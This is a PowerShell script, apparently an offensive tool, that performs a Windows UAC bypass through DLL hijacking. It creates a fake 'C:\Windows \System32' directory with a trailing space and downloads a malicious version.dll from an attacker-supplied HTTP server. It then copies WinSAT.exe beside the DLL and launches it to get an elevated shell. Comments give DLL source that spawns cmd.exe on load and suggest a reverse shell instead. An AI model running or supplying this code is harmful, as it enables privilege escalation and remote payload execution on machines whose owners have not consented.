function Invoke-WinSATBypass
{
    [CmdletBinding()] param (
    [Parameter()] [String] $HTTPServerIP
    )

    # The DLL can be compiled using this template: git clone https://github.com/zeffy/prxdll_templates.git
    # After having cloned the project, edit the dllmain.c file in the project prxdll_version
    # with the following code and build the project, don't forget to switch your build option to Release:
    #
    # #include "pch.h"
    # #include "prxdll.h"
    # #include "windows.h"
    #
    # BOOL APIENTRY DllMain(
    #    const HINSTANCE instance,
    #    const DWORD reason,
    #    const PVOID reserved)
    # {
    #    switch ( reason ) {
    #    case DLL_PROCESS_ATTACH:
    #	     WinExec("cmd.exe",1); # Could also be a Powershell reverse shell one-liner
    #        DisableThreadLibraryCalls(instance);
    #        return prx_attach(instance);
    #    case DLL_PROCESS_DETACH:
    #        prx_detach(reserved);
    #        break;
    #    }
    #    return TRUE;
    # }

    $banner = @”


    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █▄░▄█░▄▄▀█▀███▀█▀▄▄▀█░█▀█░▄▄█████░███░██▄██░▄▄▀██░▄▄▄░█░▄▄▀█▄▄░▄▄██░▄▄▀█░██░█▀▄▄▀█░▄▄▀█░▄▄█░▄▄
    ██░██░██░██░▀░██░██░█░▄▀█░▄▄█▄▄██░█░█░██░▄█░██░██▄▄▄▀▀█░▀▀░███░████░▄▄▀█░▀▀░█░▀▀░█░▀▀░█▄▄▀█▄▄▀
    █▀░▀█▄██▄███▄████▄▄██▄█▄█▄▄▄█████▄▀▄▀▄█▄▄▄█▄██▄██░▀▀▀░█░██░███░████░▀▀░█▀▀▀▄█░████▄██▄█▄▄▄█▄▄▄
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀


“@

    $ProgressPreference = 'SilentlyContinue'
    $mockDirectory = '\\?\C:\Windows \System32';
    $uacBypass = "$mockDirectory\WinSAT.exe";
    $uacBypassCMD = "C:\Windows \System32\WinSAT.exe";
    $downloadSucceed = $false;

    Write-Output "$banner";

    if ($HTTPServerIP -eq $null -or $HTTPServerIP -eq '') {
        $HTTPServerIP = '127.0.0.1';
        Write-Output "[-] No HTTP Server IP supplied, defaulting to 127.0.0.1";
    }

    $url = "http://$HTTPServerIP/version.dll";

    # Creates a Mock Directory that will be use for DLL Hijacking
    Write-Output "[+] Creating mock directory: $mockDirectory";
    New-Item "$mockDirectory" -ItemType Directory | Out-Null ;
    timeout 1 | Out-Null ;

    # Try to download our malicious version.dll and copying it to our mock directory
    Write-Output "[+] Fetching DLL from: $url";
    timeout 1 | Out-Null ;
    try {
        Invoke-WebRequest ("$url") -outfile "C:\Windows \System32\version.dll";
        $downloadSucceed = $true;
    }
    catch [System.Net.WebException] {
        Write-Output "[-] Failed to fetch version.dll from: $url";
        $downloadSucceed = $false;
    }

    if ($downloadSucceed) {

        # Copies WinSAT.exe from System32 which normally loads version.dll
        Write-Output "[+] Copying WinSAT.exe in mock directory: $mockDirectory";
        cp C:\Windows\System32\WinSAT.exe "$uacBypass";
        
        # Execute WinSAT.exe and get an elevated shell
        Write-Output "[+] Launching UAC Bypass: $uacBypass";
        cmd.exe /c $uacBypassCMD
    }

    # Removes the mock directory recursively
    Write-Output "[+] Removing mock directory: $mockDirectory";
    Remove-Item "\\?\C:\Windows \" -Recurse -Force;
}
